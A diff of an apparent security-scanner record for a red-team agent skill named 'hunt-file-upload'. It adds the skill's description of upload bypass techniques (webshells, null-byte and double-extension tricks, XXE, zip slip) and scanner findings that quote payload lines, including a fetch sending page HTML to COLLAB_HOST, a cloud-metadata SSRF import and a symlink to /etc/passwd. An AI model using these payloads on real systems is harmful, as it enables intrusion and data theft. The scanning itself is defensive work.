@@ -4,24 +4,120 @@
   "repo": "baiqi-redteam-lab",
   "path": ".claude/skills/hunt-file-upload",
   "name": "hunt-file-upload",
-  "description": "",
+  "description": "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with script tags, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples.",
   "stars": 12,
-  "category": "other",
+  "category": "coding",
   "commit": "f6133312c205bbe875013c1c01683456d3a8822f",
   "contentHash": "6b1dc617ab6974c2c1b718d8c45685e5378aeee8dbc6951d9b90bd9b0cde593f",
   "repoCreatedAt": "2026-08-10T06:36:14Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-19T10:50:00.942Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-21T10:21:16.775Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 55,
+        "excerpt": "cat > /tmp/ssrf.mvg << 'EOF'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 79,
+        "excerpt": "cat > /tmp/ssrf.m3u8 << 'EOF'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 106,
+        "excerpt": "PAYLOAD='<html><head><style>@import url(\"http://169.254.169.254/latest/meta-data/\");</style></head><body>test</body></html>'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 116,
+        "excerpt": "fetch(\"http://COLLAB_HOST/chrome-rce?d=\" + encodeURIComponent(document.documentElement.innerHTML));",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "collab_host"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 120,
+        "excerpt": "curl -s -X POST \"https://$TARGET/api/generate-pdf\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 131,
+        "excerpt": "pip3 install evilarc",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 131,
+        "excerpt": "pip3 install evilarc",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "writes-outside",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 136,
+        "excerpt": "ln -s /etc/passwd /tmp/sym_attack/innocent.txt",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 143,
+        "excerpt": "curl -s -X POST \"https://$TARGET/api/import\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": ".claude/skills/hunt-file-upload/SKILL.md",
+        "line": 153,
+        "excerpt": "- **`hunt-xss`** — SVGs, HTML files, and PDFs uploaded then served on the same origin are stored-XSS factories. Chain primitive: upload SVG with `<script>fetch(",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      }
+    ],
+    "findingTotals": {
+      "shell": 4,
+      "network": 4,
+      "downloads-code": 1,
+      "writes-outside": 1
+    },
+    "score": 69,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 0,
-    "filesSkipped": 1
+    "filesScanned": 1,
+    "filesSkipped": 0
   },
   "history": [
     {
